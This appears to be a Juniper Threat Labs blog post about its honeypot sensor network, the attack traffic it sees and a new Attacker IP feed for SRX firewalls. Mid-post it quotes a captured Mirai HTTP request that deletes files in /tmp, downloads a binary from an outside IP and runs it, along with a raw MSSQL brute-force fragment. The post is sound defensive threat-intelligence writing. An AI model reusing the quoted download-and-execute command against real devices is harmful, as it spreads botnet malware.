@@ -1,0 +1,87 @@
+Juniper Threat Labs (JTL) has a network of sensors throughout the world that we use to monitor cyber security threats.
+
+These threats can range from Brute Force attacks against logins, such as SSH, FTP, telnet and RDP, to more sophisticated attacks against SMB, Citrix and databases.
+
+  
+
+The JTL sensors are designed to mimic the majority of common operating systems currently on the internet in both up-to-date patched and unpatched systems.
+
+These sensors are located in every continent, with the exception of Antarctica, and focus on locations that might be tempting to attackers, as well as locations that are a focus for certain threat groups.
+
+We monitor the attack locations and look for trends of which locations have become a hotbed of activity.
+
+The map below is an example of attacks happening in real-time, showing the point of origin of attacks against the Juniper Threat Labs’ sensors.
+
+Juniper Threat Labs also employs various types of sensors within its intelligence network.
+
+These sensors pick up numerous attacks on all 65,535 different network ports.
+
+We see the well-known ports attacked regularly, but threat actors commonly spread their attacks across the entire fourth layer of the TCP/IP stack.
+
+This chart shows the spread of attacks across one set of sensors over a seven day period.
+
+The sensors are rotated out regularly to provide a larger footprint for potential attackers, as well as to prevent attackers from identifying these sensors as research devices.
+
+Using these sensors, we see attacks that range from simple IoT device attacks, such as this attack targeting a common Digital Video Recorder using the Mirai botnet.
+
+GET /shell?cd+/tmp;rm+-rf+*;wget+192.3.67.106/beastmode/b3astmode.arm7;chmod+777+/tmp/b3astmode.arm7;sh+/tmp/b3astmode.arm7+BeastMode.
+
+Rep.Jaws HTTP/1.1 User-Agent: Hello, world Host:
+
+127.0.0.1:80 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Connection: keep-alive
+
+Currently, Mirai is one of the most common botnets we are seeing attack IoT devices.
+
+  Variants of Mirai have developed with over 70 different vulnerabilities and rising.
+
+Some popular variants like Okiru, Masuta and IoTroop (and, most recently, SORA, UNSTABle Hoaxcall or Mirai XTC) are making the rounds.
+
+While there are some guesses as to the number of variants of Mirai, no one can be certain of how many different developers have taken the code and made it their own.
+
+We also see daily brute force attacks against numerous different software packages.
+
+One of the most common is MSSQL database.
+
+The attack shown below is one of the thousands of different brute force attacks we see on a daily basis.
+
+Mssqla5yqbm5,mo`~!@ ~#$%^&*(),.; 000000a0 ��, squelda 1.0 5yqbm5,mo`~!@ ~#$%^&*(),.;
+
+MSDBLIB Juniper SecIntel offers curated threat intelligence that is continuously updated, actionable and validated by Juniper Threat Labs.
+
+This includes a Command and Control (CnC) feed that provides Command and Control IPs that attackers are using to establish persistence, control malware or maintain their connection to your network.
+
+We also recently added a new Attacker IP feed that contains IPs that were seen attempting to compromise our sensor network to establish the persistence that the attacker is seeking to maintain.
+
+IPs are collected within a broker, then separated into attack threat types and aggregated into various categories that will be used to enhance this feed, as well as create new feeds that can be acted on via Juniper firewalls and routers.
+
+Each attacker IP is assigned a threat value from 1 -10, with 10 being the highest severity.
+
+As time goes on, if no additional malicious activity is seen by our sensors from a particular IP, its threat level will wane and then drop off completely.
+
+The IPs that are harvested from these sensors are then automatically vetted and cross-referenced with a DNS threat feed that maps out related domains, IPs and infrastructure to mitigate potential false positives.
+
+This will also include reputation data from other companies and partners who are participating in research to identify insecure or compromised systems on the internet.
+
+To take advantage of the new Attacker IP feed, make sure to have the SecIntel service configured on the SRX to protect against inbound traffic.
+
+Step 1) Check to see the feed is enabled in the ATP Cloud Portal.
+
+Step 2)
+
+Create a Threat Prevention Policy that will permit, block and log IPs, URLs and domains of a certain threat level.
+
+The example below uses Juniper best practices and permits from threat level 1-4, logs from 5-7 and then blocks from 8-10.
+
+Step 3)
+
+Create a security policy for the SRX Series firewall that uses the SecIntel feature on inbound traffic from the internet.
+
+In closing, while Juniper Threat Labs has considerable visibility into attacks in the wild, we want to emphasize that no security vendor has full visibility into every attack or every threat actor active on the internet.
+
+That is why we partner with many third parties to gain a better visibility into the big picture, including the Cyber Threat Alliance where we share our intelligence and we gain insight from other security vendors.
+
+Our priority is to protect our customers networks and make the internet a safer place for everyone.
+
+
+
+
